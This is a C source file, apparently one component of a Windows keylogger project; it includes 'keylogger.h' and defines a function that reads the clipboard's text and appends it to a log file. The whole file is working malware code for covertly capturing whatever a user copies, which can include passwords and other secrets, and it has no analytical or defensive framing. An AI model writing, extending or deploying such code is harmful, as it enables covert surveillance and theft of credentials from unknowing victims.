#include "keylogger.h"

void	get_clipboard(void)
{
	FILE	*log;
	HGLOBAL	clip;
	char	*str;

	if (!OpenClipboard(0))
		return ;
	clip = GetClipboardData(CF_TEXT);
	if (clip)
	{
		str = GlobalLock(clip);
		if (str)
		{
			fopen_s(&log, LOGNAME, "a");
			fprintf_s(log, "\n{CLIPBOARD: %s}\n", str);
			fclose(log);
		}
		GlobalUnlock(clip);
	}
	CloseClipboard();
}
